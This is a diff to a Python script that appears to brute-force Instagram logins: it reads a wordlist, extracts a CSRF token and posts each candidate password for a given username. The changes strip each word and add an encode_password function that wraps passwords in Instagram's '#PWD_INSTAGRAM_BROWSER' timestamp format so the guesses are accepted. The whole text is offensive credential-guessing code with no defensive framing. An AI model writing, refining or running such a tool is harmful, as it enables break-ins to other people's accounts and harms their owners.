@@ -2,6 +2,8 @@ import urllib.request as rq
 import random
 import urllib.parse as http_parser
 import argparse
+import time
+
 
 def main(username, words):
 
@@ -10,7 +12,9 @@ def main(username, words):
 
   csrf_token = extract_csrf_token(html)
 
-  for password in words:
+  for word in words:
+
+    password = word.strip()
 
     craft_response(username, password, csrf_token)
 
@@ -51,7 +55,7 @@ def craft_response(username, password, csrf_token):
 
   values = {
     'username': username,
-    'enc_password': password,
+    'enc_password': encode_password(password),
     'Ps': '',
     'queryParams': '{}',
     'optIntoOneTap': 'false'
@@ -98,6 +102,16 @@ def craft_response(username, password, csrf_token):
 
     except Exception as err:
       print("Error: {0}".format(err))
+
+def encode_password(password):
+
+  formatted_time = str(int(time.time()))
+
+  print (formatted_time) 
+
+  enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password
+
+  return enc_password
 
 
 
